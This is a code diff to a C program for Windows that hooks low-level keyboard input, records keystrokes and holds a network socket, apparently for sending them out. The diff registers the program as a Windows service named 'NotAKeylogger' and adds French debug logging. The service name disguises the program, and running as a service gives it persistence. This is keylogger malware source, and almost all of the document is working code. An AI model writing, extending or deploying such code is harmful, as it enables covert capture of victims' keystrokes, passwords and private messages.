@@ -3,6 +3,8 @@
 ///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 SOCKET my_sock = INVALID_SOCKET;
+SERVICE_STATUS service_status;
+SERVICE_STATUS_HANDLE hstatus;
 const struct keyboard keyboard[] =
 {
 	{ VK_BACK, "[BACK]" },
@@ -111,12 +113,24 @@ const struct keyboard keyboard[] =
 	{ 0, "[UNKNOWN]" }
 };
 
+int						WriteToLog(char* str)
+{
+	FILE				*log;
+	log = fopen(LOGFILE, "a+");
+	if (log == NULL)
+		return -1;
+	fprintf(log, "%s\n", str);
+	fclose(log);
+	return 0;
+}
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
 	size_t			  i = 0;
 	static int		  shift;
 
+	WriteToLog("LowLevelKeyboardProc\n");
 	if (nCode < 0)
 		return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
@@ -132,6 +146,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 		printf("%s %zu %d\n", keyboard[i].character, strlen(keyboard[i].character), shift);
 	}
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
+}
+
+void					stop_struct(void)
+{
+	service_status.dwWin32ExitCode = 0;
+	service_status.dwCurrentState = SERVICE_STOPPED;
+	SetServiceStatus(hstatus, &service_status);
+	return;
 }
 
 void	setwinhook()
@@ -188,15 +210,43 @@ void	save_data(const char *data)
 	timet1 = timet2;
 	nbChar++;
 }
+void					ControlHandler(DWORD request)
+{
+	switch (request)
+	{
+	case SERVICE_CONTROL_STOP:
+		stop_struct();
+		return;
+	case SERVICE_CONTROL_SHUTDOWN:
+		stop_struct();
+		return;
+	default:
+		break;
+	}
+	SetServiceStatus(hstatus, &service_status);
+	return;
+}
 
-int	main(void)
+void				init_struct(void)
+{
+	service_status.dwServiceType = SERVICE_WIN32;
+	service_status.dwCurrentState = SERVICE_START_PENDING;
+	service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+	service_status.dwWin32ExitCode = 0;
+	service_status.dwServiceSpecificExitCode = 0;
+	service_status.dwCheckPoint = 0;
+	service_status.dwWaitHint = 0;
+	hstatus = RegisterServiceCtrlHandler(L"NotAKeylogger", (LPHANDLER_FUNCTION)ControlHandler);
+}
+
+int ServiceMain(void)
 {
 	MSG msg;
-	WSADATA wsadata;
-
-	WSAStartup(MAKEWORD(2, 0), &wsadata);
+	WriteToLog("Debut du servicemain\n");
 	my_sock = init_socket(my_sock);
+	WriteToLog("Apres socket\n");
 	setwinhook();
+	WriteToLog("Apres setwinhook\n");
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
@@ -211,9 +261,25 @@ int	main(void)
 	{
 		printf("failed shutdown\n");
 		closesocket(my_sock);
-		return;
+		return (-1);
 	}
 	closesocket(my_sock);
+	return ((int)msg.wParam);
+}
+
+int	main(void)
+{
+	WSADATA wsadata;
+	SERVICE_TABLE_ENTRY service_table[2];
+
+	WriteToLog("dans le main au debut\n");
+	service_table[0].lpServiceName = L"NotAKeylogger";
+	service_table[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+	service_table[1].lpServiceName = NULL;
+	service_table[1].lpServiceProc = NULL;
+	WSAStartup(MAKEWORD(2, 0), &wsadata);
+	StartServiceCtrlDispatcher(service_table);
+	WriteToLog("A la fin du main\n");
 	WSACleanup();
-	return (msg.wParam);
+	return (0);
 }
